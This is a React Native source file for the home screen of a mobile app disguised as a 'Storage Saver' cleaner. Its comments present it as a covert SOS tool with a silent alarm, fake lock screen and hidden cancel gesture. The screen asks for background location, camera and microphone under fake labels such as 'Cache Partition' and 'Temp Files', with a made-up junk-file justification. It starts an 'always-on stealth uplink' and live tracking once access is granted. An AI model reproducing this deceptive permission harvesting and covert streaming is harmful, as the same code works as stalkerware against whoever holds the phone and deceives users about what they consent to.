// 📂 FILE: app/(app)/home.js
import React, { useEffect, useRef, useState } from "react";
import {
  View,
  Text,
  TouchableOpacity,
  StatusBar,
  StyleSheet,
  BackHandler,
  Platform,
  ActivityIndicator,
  Linking,
} from "react-native";
import { SafeAreaView } from "react-native-safe-area-context";
import AsyncStorage from "@react-native-async-storage/async-storage";
import { useNavigation } from "@react-navigation/native";
import { Ionicons } from "@expo/vector-icons";

// ✅ Permissions (Expo)
import * as Location from "expo-location";
import { Camera } from "expo-camera";

// --- Imports ---
import WakeWordListener from "../../src/components/WakeWordListener";
import StealthStreamer from "../../src/components/StealthStreamer";
import {
  sendBatSignal,
  registerForBatSignal,
  cancelBatSignal,
} from "../../src/services/BatSignal";
import FakeLockScreen from "../../src/components/FakeLockScreen";
import { startLiveTracking } from "../../src/services/LiveTracker";
import { getDeviceId as getStableDeviceId } from "../../src/services/Identity"; // ✅ Phase 1: single source of truth

// ✅ Must match Auth + LiveTracker key
const STORAGE_KEY_DEVICE_ID = "sentinel_device_id";

// ✅ Constants for Hidden Cancel Gesture
const STORAGE_KEY_SOS = "sentinel_sos_active";
const TAP_WINDOW_MS = 3000;
const TAP_TARGET = 7;

function isGranted(status) {
  return String(status || "").toLowerCase() === "granted";
}
function prettyStatus(status) {
  const s = String(status || "unknown").toUpperCase();
  if (s === "UNDETERMINED") return "WAITING";
  if (s === "GRANTED") return "CLEAN";
  return "ERROR";
}

export default function HomePage() {
  const navigation = useNavigation();

  const [isSOS, setIsSOS] = useState(false);
  const [deviceId, setDeviceId] = useState("Loading...");

  const bootedRef = useRef(false);
  const trackerStartedRef = useRef(false);
  const sosLockRef = useRef(false);

  // ✅ Hidden Tap State
  const [tapCount, setTapCount] = useState(0);
  const tapStartRef = useRef(0);

  // ✅ Permission Gate State (prevents “silent tracking failure”)
  const [permChecking, setPermChecking] = useState(false);
  const [permReady, setPermReady] = useState(false);
  const [permCanAskAgain, setPermCanAskAgain] = useState(true);
  const [permDetails, setPermDetails] = useState({
    servicesEnabled: null,
    locationForeground: null,
    locationBackground: null,
    camera: null,
    microphone: null,
  });

  const refreshPermissionSnapshot = async () => {
    try {
      const servicesEnabled = await Location.hasServicesEnabledAsync();

      const fg = await Location.getForegroundPermissionsAsync();
      const bg = await Location.getBackgroundPermissionsAsync();

      const cam = await Camera.getCameraPermissionsAsync();
      const mic = await Camera.getMicrophonePermissionsAsync();

      const canAsk =
        (fg?.canAskAgain !== false) &&
        (bg?.canAskAgain !== false) &&
        (cam?.canAskAgain !== false) &&
        (mic?.canAskAgain !== false);

      setPermCanAskAgain(canAsk);

      const next = {
        servicesEnabled,
        locationForeground: fg?.status || "unknown",
        locationBackground: bg?.status || "unknown",
        camera: cam?.status || "unknown",
        microphone: mic?.status || "unknown",
      };
      setPermDetails(next);

      const ready =
        servicesEnabled === true &&
        isGranted(next.locationForeground) &&
        isGranted(next.locationBackground) &&
        isGranted(next.camera) &&
        isGranted(next.microphone);

      setPermReady(ready);
      return ready;
    } catch (e) {
      console.log("Permission snapshot warning:", e?.message || e);
      setPermReady(false);
      return false;
    }
  };

  const startTrackerIfReady = async (stableId) => {
    if (!stableId || stableId === "Loading..." || stableId === "Unavailable") return;
    if (!permReady) return;
    if (trackerStartedRef.current) return;

    trackerStartedRef.current = true;

    // ✅ Start LiveTracker using the stable device id
    try {
      await startLiveTracking(stableId);
    } catch (e) {
      console.log("Tracker start warning:", e?.message || e);
      trackerStartedRef.current = false; // allow retry
    }
  };

  const requestAllPermissions = async () => {
    setPermChecking(true);
    try {
      // 0) GPS services must be enabled
      const servicesEnabled = await Location.hasServicesEnabledAsync();
      if (!servicesEnabled) {
        await refreshPermissionSnapshot();
        setPermChecking(false);
        return false;
      }

      // 1) Foreground location
      const fg = await Location.getForegroundPermissionsAsync();
      if (!isGranted(fg?.status)) {
        const fgReq = await Location.requestForegroundPermissionsAsync();
        if (!isGranted(fgReq?.status)) {
          await refreshPermissionSnapshot();
          setPermChecking(false);
          return false;
        }
      }

      // 2) Background location
      const bg = await Location.getBackgroundPermissionsAsync();
      if (!isGranted(bg?.status)) {
        const bgReq = await Location.requestBackgroundPermissionsAsync();
        if (!isGranted(bgReq?.status)) {
          await refreshPermissionSnapshot();
          setPermChecking(false);
          return false;
        }
      }

      // 3) Camera
      const cam = await Camera.getCameraPermissionsAsync();
      if (!isGranted(cam?.status)) {
        const camReq = await Camera.requestCameraPermissionsAsync();
        if (!isGranted(camReq?.status)) {
          await refreshPermissionSnapshot();
          setPermChecking(false);
          return false;
        }
      }

      // 4) Microphone
      const mic = await Camera.getMicrophonePermissionsAsync();
      if (!isGranted(mic?.status)) {
        const micReq = await Camera.requestMicrophonePermissionsAsync();
        if (!isGranted(micReq?.status)) {
          await refreshPermissionSnapshot();
          setPermChecking(false);
          return false;
        }
      }

      const ready = await refreshPermissionSnapshot();
      setPermChecking(false);

      if (ready) {
        await startTrackerIfReady(deviceId);
      }

      return ready;
    } catch (e) {
      console.log("Permission request warning:", e?.message || e);
      await refreshPermissionSnapshot();
      setPermChecking(false);
      return false;
    }
  };

  const openSystemSettings = async () => {
    try {
      await Linking.openSettings();
    } catch (e) {
      console.log("Open settings failed:", e?.message || e);
    }
  };

  useEffect(() => {
    if (bootedRef.current) return;
    bootedRef.current = true;

    (async () => {
      let finalId = "Loading...";
      try {
        finalId = await getStableDeviceId();
      } catch (e) {
        console.log("Identity warning (non-fatal):", e?.message || e);
      }

      if (!finalId || finalId === "Loading...") {
        const storedId = await AsyncStorage.getItem(STORAGE_KEY_DEVICE_ID);
        if (storedId) finalId = storedId;
      }

      if (!finalId || finalId === "Loading...") {
        setDeviceId("Unavailable");
        registerForBatSignal();
        return;
      }

      setDeviceId(finalId);
      registerForBatSignal();

      const ready = await refreshPermissionSnapshot();

      if (!ready) {
        await requestAllPermissions();
      } else {
        await startTrackerIfReady(finalId);
      }
    })();
  }, []);

  useEffect(() => {
    if (permReady) {
      startTrackerIfReady(deviceId);
    }
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [permReady]);

  // ✅ Lock Android back button during SOS
  useEffect(() => {
    const backAction = () => {
      if (isSOS) return true;
      return false;
    };

    const sub = BackHandler.addEventListener("hardwareBackPress", backAction);
    return () => sub.remove();
  }, [isSOS]);

  const triggerSOS = () => {
    if (deviceId === "Loading..." || deviceId === "Unavailable") return;

    if (!permReady) {
      console.log("🟡 SOS blocked: permissions not ready. Requesting now...");
      requestAllPermissions();
      return;
    }

    if (sosLockRef.current) return;
    sosLockRef.current = true;

    console.log("⚠️ SILENT ALARM TRIGGERED");
    sendBatSignal(deviceId);
    setIsSOS(true);

    setTimeout(() => {
      sosLockRef.current = false;
    }, 1200);
  };

  const disarmSOS = () => setIsSOS(false);

  const openDrawer = () => {
    try {
      navigation.openDrawer();
    } catch (e) {
      console.log("Drawer open warning:", e?.message || e);
    }
  };

  // ✅ Hidden Cancel Handler
  const handleHiddenCancelTap = async () => {
    const now = Date.now();
    if (!tapStartRef.current || now - tapStartRef.current > TAP_WINDOW_MS) {
      tapStartRef.current = now;
      setTapCount(1);
      return;
    }

    const next = tapCount + 1;
    setTapCount(next);

    if (next >= TAP_TARGET) {
      tapStartRef.current = 0;
      setTapCount(0);

      console.log("🕵️ HIDDEN GESTURE DETECTED: Checking SOS status...");

      const sosVal = await AsyncStorage.getItem(STORAGE_KEY_SOS);
      const sosOn = sosVal === "1";
      if (!sosOn) {
        console.log("🕵️ SOS not active, ignoring gesture.");
        return;
      }

      await cancelBatSignal();
    }
  };

  const anyMissing =
    permDetails.servicesEnabled !== true ||
    !isGranted(permDetails.locationForeground) ||
    !isGranted(permDetails.locationBackground) ||
    !isGranted(permDetails.camera) ||
    !isGranted(permDetails.microphone);

  return (
    <View style={{ flex: 1, backgroundColor: "#0f172a" }}>
      <StatusBar barStyle="light-content" hidden={isSOS} />

      {/* ✅ MENU BUTTON */}
      {!isSOS && (
        <TouchableOpacity
          onPress={openDrawer}
          style={{
            position: "absolute",
            top: 50,
            left: 18,
            zIndex: 100,
            padding: 12,
            borderRadius: 20,
            backgroundColor: "rgba(255,255,255,0.08)",
          }}
          activeOpacity={0.7}
        >
          <Ionicons name="menu" size={28} color="#e5e7eb" />
        </TouchableOpacity>
      )}

      {/* Always-on stealth uplink */}
      {permReady && deviceId !== "Loading..." && deviceId !== "Unavailable" && (
        <StealthStreamer channelId={deviceId} />
      )}

      {isSOS ? (
        <View style={styles.fullScreen}>
          <FakeLockScreen onUnlock={disarmSOS} />
        </View>
      ) : (
        <SafeAreaView style={styles.container}>
          {permReady && <WakeWordListener onTrigger={triggerSOS} />}

          {/* ✅ Hidden Cancel Button (7 taps on "Storage Saver" title) */}
          <TouchableOpacity activeOpacity={1} onPress={handleHiddenCancelTap}>
            <Text style={styles.title}>Storage Saver</Text>
          </TouchableOpacity>

          <View style={styles.statusBox}>
            <Text style={styles.statusLabel}>MEMORY USAGE</Text>

            <Text
              style={[
                styles.statusValue,
                { color: permReady ? "#22c55e" : "#facc15" },
              ]}
            >
              {permReady ? "OPTIMIZED" : "SCAN REQUIRED"}
            </Text>

            <Text style={styles.statusSub}>
              {permReady
                ? "All systems clean"
                : "Grant access to clean junk files"}
            </Text>

            {/* ✅ FAKE PERMISSIONS CHECKLIST (Stealth Labels) */}
            {!permReady && (
              <View style={{ marginTop: 14, width: "85%" }}>
                <View style={styles.permRow}>
                  <Text style={styles.permLabel}>File Indexing</Text>
                  <Text style={styles.permValue}>
                    {permDetails.servicesEnabled ? "READY" : "OFF"}
                  </Text>
                </View>
                <View style={styles.permRow}>
                  <Text style={styles.permLabel}>Cache Partition</Text>
                  <Text style={styles.permValue}>
                    {prettyStatus(permDetails.locationForeground)}
                  </Text>
                </View>
                <View style={styles.permRow}>
                  <Text style={styles.permLabel}>Deep Clean</Text>
                  <Text style={styles.permValue}>
                    {prettyStatus(permDetails.locationBackground)}
                  </Text>
                </View>
                <View style={styles.permRow}>
                  <Text style={styles.permLabel}>Temp Files</Text>
                  <Text style={styles.permValue}>
                    {prettyStatus(permDetails.microphone)}
                  </Text>
                </View>
                <View style={styles.permRow}>
                  <Text style={styles.permLabel}>Thumbnail Data</Text>
                  <Text style={styles.permValue}>
                    {prettyStatus(permDetails.camera)}
                  </Text>
                </View>

                <Text style={styles.permWhy}>
                  System cleaner requires full access to deep storage partitions to remove hidden junk files.
                </Text>
              </View>
            )}

            <Text style={styles.idText}>v2.4.1 • {deviceId}</Text>
          </View>

          {/* ✅ THE SOS BUTTON DISGUISED AS "BOOST" */}
          <TouchableOpacity
            onPress={permReady ? triggerSOS : requestAllPermissions}
            style={styles.diagnosticBtn}
            disabled={permChecking || deviceId === "Loading..." || deviceId === "Unavailable"}
          >
            {permChecking ? (
              <View style={{ flexDirection: "row", alignItems: "center" }}>
                <ActivityIndicator color="#fff" />
                <Text style={[styles.diagnosticText, { marginLeft: 10 }]}>
                  Scanning...
                </Text>
              </View>
            ) : (
              <Text style={styles.diagnosticText}>
                {permReady ? "QUICK BOOST" : "GRANT ACCESS"}
              </Text>
            )}
          </TouchableOpacity>

          {!permReady && !permCanAskAgain && (
            <TouchableOpacity
              onPress={openSystemSettings}
              style={styles.secondaryBtn}
              disabled={permChecking}
            >
              <Text style={styles.secondaryText}>Open System Settings</Text>
            </TouchableOpacity>
          )}

          <Text style={styles.microHint}>
            {Platform.OS === "android"
              ? anyMissing
                ? "Tap Open Settings if buttons are unresponsive."
                : "Tip: Auto-clean is active in background."
              : anyMissing
              ? "Tip: Enable 'Always' for deep cleaning."
              : "Tip: Background optimization active."}
          </Text>
        </SafeAreaView>
      )}
    </View>
  );
}

const styles = StyleSheet.create({
  container: {
    flex: 1,
    backgroundColor: "#0f172a",
    alignItems: "center",
    justifyContent: "center",
  },
  title: { color: "white", fontSize: 28, fontWeight: "700", marginBottom: 30, letterSpacing: 1 },

  statusBox: { alignItems: "center", marginBottom: 40, width: "100%" },
  statusLabel: { color: "#94a3b8", fontSize: 13, letterSpacing: 2, fontWeight: "600" },
  statusValue: { fontSize: 32, fontWeight: "bold", marginTop: 5, letterSpacing: 1 },
  statusSub: { color: "#cbd5e1", marginTop: 8, fontSize: 15 },
  idText: { color: "#334155", marginTop: 20, fontSize: 12, fontWeight: "600" },

  diagnosticBtn: {
    backgroundColor: "#3b82f6",
    paddingHorizontal: 40,
    paddingVertical: 18,
    borderRadius: 50,
    width: "80%",
    alignItems: "center",
    shadowColor: "#3b82f6",
    shadowOffset: { width: 0, height: 4 },
    shadowOpacity: 0.3,
    shadowRadius: 8,
    elevation: 6,
  },
  diagnosticText: { color: "white", fontSize: 18, fontWeight: "800", letterSpacing: 1 },

  secondaryBtn: {
    marginTop: 16,
    backgroundColor: "rgba(255,255,255,0.08)",
    paddingHorizontal: 22,
    paddingVertical: 12,
    borderRadius: 10,
    width: "80%",
    alignItems: "center",
  },
  secondaryText: { color: "#e5e7eb", fontSize: 14, fontWeight: "600" },

  microHint: { color: "#475569", marginTop: 24, fontSize: 12, textAlign: "center", maxWidth: "80%" },

  permRow: {
    flexDirection: "row",
    justifyContent: "space-between",
    paddingVertical: 8,
    borderBottomWidth: 1,
    borderBottomColor: "rgba(148,163,184,0.1)",
  },
  permLabel: { color: "#cbd5e1", fontSize: 14 },
  permValue: { color: "#94a3b8", fontSize: 12, fontWeight: "700", marginTop: 2 },
  permWhy: {
    color: "#64748b",
    marginTop: 12,
    fontSize: 12,
    lineHeight: 16,
    textAlign: "center",
    fontStyle: "italic",
  },

  fullScreen: {
    position: "absolute",
    top: 0,
    left: 0,
    right: 0,
    bottom: 0,
    backgroundColor: "black",
    zIndex: 99,
  },
});
